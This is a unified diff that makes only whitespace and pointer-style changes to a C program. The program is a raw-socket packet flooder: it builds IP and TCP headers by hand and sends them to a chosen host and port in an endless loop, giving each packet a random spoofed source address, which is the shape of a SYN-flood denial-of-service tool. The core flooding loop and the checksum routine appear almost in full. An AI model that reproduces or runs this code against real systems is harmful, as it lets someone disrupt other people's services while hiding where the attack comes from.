@@ -7,14 +7,14 @@
 #include<netinet/ip.h>
 #include<netinet/tcp.h>
 
-void send_data(int sockfd, struct sockaddr_in* addr, char* port);
-unsigned short check_sum(unsigned short* addr, int len);
+void send_data(int sockfd, struct sockaddr_in *addr, char *port);
+unsigned short check_sum(unsigned short *addr, int len);
 
 // ./argv[0] des_hostname/ip   des_port  local_port
-int main(int argc, char* argv[]) {
+int main(int argc, char *argv[]) {
     int sockfd;
     struct sockaddr_in addr;
-    struct hostent* host;
+    struct hostent *host;
     int on = 1;
 
     if (argc != 4) {
@@ -33,7 +33,7 @@ int main(int argc, char* argv[]) {
             exit(EXIT_FAILURE);
         }
 
-        addr.sin_addr = *(struct in_addr*)(host->h_addr_list[0]);
+        addr.sin_addr = *(struct in_addr *)(host->h_addr_list[0]);
     }
 
     addr.sin_port = htons(atoi(argv[2]));
@@ -48,14 +48,14 @@ int main(int argc, char* argv[]) {
     send_data(sockfd, &addr, argv[3]);
 }
 
-void send_data(int sockfd, struct sockaddr_in* addr, char* port) {
+void send_data(int sockfd, struct sockaddr_in *addr, char *port) {
     char buffer[100];
-    struct iphdr* ip;
-    struct tcphdr* tcp;
+    struct iphdr *ip;
+    struct tcphdr *tcp;
     int head_len;
     head_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
     bzero(buffer, 100);
-    ip = (struct iphdr*)buffer;
+    ip = (struct iphdr *)buffer;
     ip->version = IPVERSION;
     ip->ihl = sizeof(struct ip) >> 2;
     ip->tos = 0;
@@ -66,7 +66,7 @@ void send_data(int sockfd, struct sockaddr_in* addr, char* port) {
     ip->protocol = IPPROTO_TCP;
     ip->check = 0;
     ip->daddr = addr->sin_addr.s_addr;
-    tcp = (struct tcphdr*)(buffer + sizeof(struct ip));
+    tcp = (struct tcphdr *)(buffer + sizeof(struct ip));
     tcp->source = htons(atoi(port));
     tcp->dest = addr->sin_port;
     tcp->seq = random();
@@ -78,16 +78,16 @@ void send_data(int sockfd, struct sockaddr_in* addr, char* port) {
     while (1) {
         ip->saddr = random();
         tcp->check = 0;
-        tcp->check = check_sum((unsigned short*)tcp,
+        tcp->check = check_sum((unsigned short *)tcp,
                                sizeof(struct tcphdr));
-        sendto(sockfd, buffer, head_len, 0, (struct sockaddr*)addr, (socklen_t)sizeof(struct sockaddr_in));
+        sendto(sockfd, buffer, head_len, 0, (struct sockaddr *)addr, (socklen_t)sizeof(struct sockaddr_in));
     }
 }
 
-unsigned short check_sum(unsigned short* addr, int len) {
+unsigned short check_sum(unsigned short *addr, int len) {
     register int nleft = len;
     register int sum = 0;
-    register short* w = addr;
+    register short *w = addr;
     short answer = 0;
 
     while (nleft > 1) {
@@ -96,7 +96,7 @@ unsigned short check_sum(unsigned short* addr, int len) {
     }
 
     if (nleft == 1) {
-        *(unsigned char*)(&answer) = *(unsigned char*)w;
+        *(unsigned char *)(&answer) = *(unsigned char *)w;
         sum += answer;
     }
 
